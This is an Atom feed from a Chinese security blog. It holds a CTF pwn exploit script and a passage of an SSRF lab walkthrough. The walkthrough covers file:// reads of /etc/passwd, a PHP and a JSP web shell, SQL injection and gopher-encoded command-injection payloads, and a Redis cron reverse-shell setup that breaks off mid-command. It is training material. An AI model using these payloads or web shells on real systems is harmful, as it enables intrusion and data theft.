src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996814489-e62ce271-ef49-48db-b399-d15b31f702e4.png#averageHue=%23300b25&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=85&amp;id=ub9c3ffa3&amp;originHeight=128&amp;originWidth=684&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=16770&amp;status=done&amp;style=none&amp;taskId=u188da057-fd77-40da-a627-cf123ca2a87&amp;title=&amp;width=456" alt="439b7b4556526a0ec73c101ae0b03e5b_.png"></p><ul><li>exp</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="emphasis">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, 10004, level=<span class="emphasis">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b&#x27;Please input your token: <span class="emphasis">&#x27;,</span></span><br><span class="line"><span class="emphasis">                b&#x27;</span>468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;Username: <span class="emphasis">&#x27;, &#x27;</span>admin&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="section">Gadgets information</span></span><br><span class="line"><span class="section">============================================================</span></span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x0000000000401359 : ret 0x1be</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload = b&#x27;a&#x27; * 40 <span class="code">+ b&#x27;\x00&#x27; * (41 - 40) +</span> b&#x27;b&#x27; * (48 <span class="code">+ 96 - 41) +</span> p64(0x40101a) * 3 + p64(0x40127e)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;Password: <span class="emphasis">&#x27;, payload)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"></span>p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714998007875-ba0fadb1-4b37-4774-988e-40dc7a35e266.png#averageHue=%2391959a&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=349&amp;id=ub001c975&amp;originHeight=524&amp;originWidth=1194&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=44000&amp;status=done&amp;style=none&amp;taskId=uf5f3f913-75d1-46c3-8d3f-c017298af16&amp;title=&amp;width=796" alt="image.png"></p>]]></content>
    
    
    <summary type="html">高校网络安全管理运维赛 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2</title>
    <link href="https://www.fomal.cc/posts/6cdb73.html"/>
    <id>https://www.fomal.cc/posts/6cdb73.html</id>
    <published>2024-03-15T12:42:09.000Z</published>
    <updated>2024-06-15T12:44:04.853Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2e7fae38d107ee4625e24d45b2f0e491c74a88e07b7ffccd561ec03c5375bc90">fe693106a95ef61794da4c5f123204e8d3c00f148706c6a206ff03754bd2b2aa9d815501f8412c47ad5b63048142b7d09da07c934a6c60afb063b71ef21c63d3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Log4j2 漏洞复现</summary>
    
    
    
    <category term="漏洞复现" scheme="https://www.fomal.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="漏洞复现" scheme="https://www.fomal.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之Fastjson</title>
    <link href="https://www.fomal.cc/posts/a8f06b6c.html"/>
    <id>https://www.fomal.cc/posts/a8f06b6c.html</id>
    <published>2024-02-15T11:54:08.000Z</published>
    <updated>2024-06-15T12:07:05.093Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java反序列化 Fastjson篇</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="Fastjson" scheme="https://www.fomal.cc/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之Shiro</title>
    <link href="https://www.fomal.cc/posts/58285500.html"/>
    <id>https://www.fomal.cc/posts/58285500.html</id>
    <published>2024-01-30T11:53:56.000Z</published>
    <updated>2024-06-15T12:07:05.089Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java反序列化 Shiro篇</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="Shiro" scheme="https://www.fomal.cc/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之CC链</title>
    <link href="https://www.fomal.cc/posts/fba70aa7.html"/>
    <id>https://www.fomal.cc/posts/fba70aa7.html</id>
    <published>2024-01-15T07:26:59.000Z</published>
    <updated>2024-06-15T12:01:48.813Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java反序列化 Commons-Collections篇</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="CC链" scheme="https://www.fomal.cc/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全基础</title>
    <link href="https://www.fomal.cc/posts/6f0aa025.html"/>
    <id>https://www.fomal.cc/posts/6f0aa025.html</id>
    <published>2024-01-04T08:31:19.000Z</published>
    <updated>2024-06-15T11:57:19.929Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java反序列化基础</summary>
    
    
    
    <category term="Java反序列化" scheme="https://www.fomal.cc/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>国光ssrf 学习记录</title>
    <link href="https://www.fomal.cc/posts/284698c.html"/>
    <id>https://www.fomal.cc/posts/284698c.html</id>
    <published>2023-12-28T12:09:21.000Z</published>
    <updated>2024-06-15T12:18:16.272Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1><a href="http://xxx.xxx.xxx.xxx:8080">xxx.xxx.xxx.xxx:8080</a></h1><p>访问网站：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201336714-364358383.png" alt="image-20240615201334230"></p><p>发现可以查询其他网站，尝试请求自己：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201343832-527934203.png" alt="image-20240615201342450"></p><p>再尝试请求一下网站下的文件：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201350988-768727537.png" alt="image-20240615201349604"></p><h2 id="172-72-23-21-ssrf">172.72.23.21-ssrf</h2><p>尝试伪协议读取本地文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201408408-433782167.png" alt="image-20240615201407003"></p><p>查看主机信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/hosts</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201418781-250058223.png" alt="image-20240615201417396">发现存在内网ip：<code>172.72.23.21</code></p><p>其他敏感文件（<code>/proc/net/fib_trie</code>，<code>/proc/net/arp</code>）读取失败，尝试爆破一下ip的C段以及端口</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201426764-1399285937.png" alt="image-20240615201425325"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201430244-975391954.png" alt="image-20240615201428731"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201432933-1283461348.png" alt="image-20240615201431537"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201436268-1302504554.png" alt="image-20240615201434979"></p><p>根据结果，我们可以整理出内网ip及端口的开放情况：</p><table><thead><tr><th>ip</th><th>port</th></tr></thead><tbody><tr><td>172.72.23.21</td><td>80</td></tr><tr><td>172.72.23.22</td><td>80</td></tr><tr><td>172.72.23.23</td><td>80，3306</td></tr><tr><td>172.72.23.24</td><td>80</td></tr><tr><td>172.72.23.26</td><td>8080</td></tr><tr><td>172.72.23.27</td><td>6379</td></tr><tr><td>172.72.23.28</td><td>80，6379</td></tr></tbody></table><h1>172.72.23.22-CodeExec</h1><p>利用burp结合字典扫目录：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201443881-463820612.png" alt="image-20240615201442455"></p><p>发现敏感目录：<code>phpinfo.php shell.php</code></p><p>尝试访问shell.php</p><p>发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以进行命令执行，因为是用bp发送的请求，所以空格需要进行两次url编码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201453271-1666985908.png" alt="image-20240615201451735"></p><h1>172.72.23.23 - SQL 注入</h1><p>通过抓包分析可知，参数为id</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201459567-947000289.png" alt="image-20240615201457982"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201502942-297181857.png" alt="image-20240615201501411"></p><p>就可以进行SQL注入了**（空格需要进行两次编码）**</p><p>通过简单判断发现，共有4个字段，回显位置是1，2，4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201516022-309753992.png" alt="image-20240615201514472"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">=</span><span class="number">172.72</span><span class="number">.23</span><span class="number">.23</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;%2520union%2520select%25201,2,3,database()--%2520// 发现数据库名为 db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url=172.72.23.23?id=-1&#x27;</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">union</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">select</span><span class="operator">%</span><span class="number">25201</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(table_name)<span class="operator">%</span><span class="number">2520</span><span class="keyword">from</span><span class="operator">%</span><span class="number">2520</span>information_schema.tables<span class="operator">%</span><span class="number">2520</span><span class="keyword">where</span><span class="operator">%</span><span class="number">2520</span>table_schema<span class="operator">=</span><span class="string">&#x27;db&#x27;</span><span class="comment">--%2520// 发现表名 flag_is_here,users</span></span><br><span class="line"></span><br><span class="line">url<span class="operator">=</span><span class="number">172.72</span><span class="number">.23</span><span class="number">.23</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;%2520union%2520select%25201,2,3,group_concat(column_name)%2520from%2520information_schema.columns%2520where%2520table_name=&#x27;</span>flag_is_here<span class="string">&#x27;--%2520// 发现字段名 content</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url=172.72.23.23?id=-1&#x27;</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">union</span><span class="operator">%</span><span class="number">2520</span><span class="keyword">select</span><span class="operator">%</span><span class="number">25201</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(content)<span class="operator">%</span><span class="number">2520</span><span class="keyword">from</span><span class="operator">%</span><span class="number">2520</span>flag_is_here<span class="comment">--%2520//发现flagggctf&#123;63cafe619721609713aedbddfdf4bba0&#125;</span></span><br></pre></td></tr></table></figure><h1>172.72.23.24 - 命令执行</h1><p>测试命令执行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201549573-92924281.png" alt="image-20240615201548096"></p><p>这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据</p><p>所以需要使用gopher协议来进行</p><p>构造：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 172.72.23.24</span><br><span class="line">Content-Length: 12</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">ip=127.0.0.1;id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST%20%2F%20HTTP%2F1.1%0AHost%3A%20172.72.23.24%0AContent-Length%3A%2012%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Aip%3D127.0.0.1%3Bid//第一次编码数据</span><br><span class="line"></span><br><span class="line">// 将%0A全部替换为%0D%0A</span><br><span class="line"></span><br><span class="line">POST%20%2F%20HTTP%2F1.1%0D%0AHost%3A%20172.72.23.24%0D%0AContent-Length%3A%2012%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aip%3D127.0.0.1%3Bid//第二次编码数据</span><br><span class="line"></span><br><span class="line">post传参：</span><br><span class="line">url=gopher://172.72.23.24:80/_POST%2520%252F%2520HTTP%252F1.1%250D%250AHost%253A%2520172.72.23.24%250D%250AContent-Length%253A%252015%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Aip%253D127.0.0.1%253Bid</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201603328-1252649798.png" alt="image-20240615201601885"></p><p>成功命令执行！</p><h1>172.72.23.26 - CVE-2017-12615</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201617198-547236948.png" alt="image-20240615201615537"></p><p>发现是tomcat服务，也是通过搜索知道了这是个cve（CVE-2017-12615）</p><p>准备好jsp的一句话木马：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(command != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.print(<span class="string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>继续构造，通过gopher协议传进去</p><p><a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/README.zh-cn.md">CVE-2017-12615)</a></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.72</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">8080</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">444</span></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(command != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.print(<span class="string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>gopher传完，返回2xx说明成功写shell：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201626406-486150676.png" alt="image-20240615201624978"></p><p>发现命令执行成功：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201634484-1224986319.png" alt="image-20240615201632955"></p><h1>172.72.23.27-redis未授权</h1><blockquote><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p></blockquote><p>简单说，漏洞的产生条件有以下两点：</p><ul><li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li></ul><p>SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以直接使用 DICT 协议来攻击，效率会高很多，DICT 协议可以攻击未授权的 Redis 服务，格式如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://x.x.x.x:6379/&lt;Redis 命令&gt;</span><br></pre></td></tr></table></figure><p>在172.72.23.27上开放着6379端口，即redis服务，尝试执行一下 <code>info</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201646702-264656312.png" alt="image-20240615201645136"></p><p>发现可以执行命令，利用定时任务反弹shell，这里用bp实现</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#清空所有数据</span></span><br><span class="line">dict://172.72.23.27:6379/flushall</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用config命令，设置要操作的路径为定时任务目录下</span></span><br><span class="line">dict://172.72.23.27:6379/config%20set%20dir%20/var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立定时任务文件为root</span></span><br><span class="line">dict://172.72.23.27:6379/config%20set%20dbfilename%20root</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置定时任务内容，开始和结束的\n是为了避免crontab的语法错误，五个*是每分钟执行一次</span></span><br><span 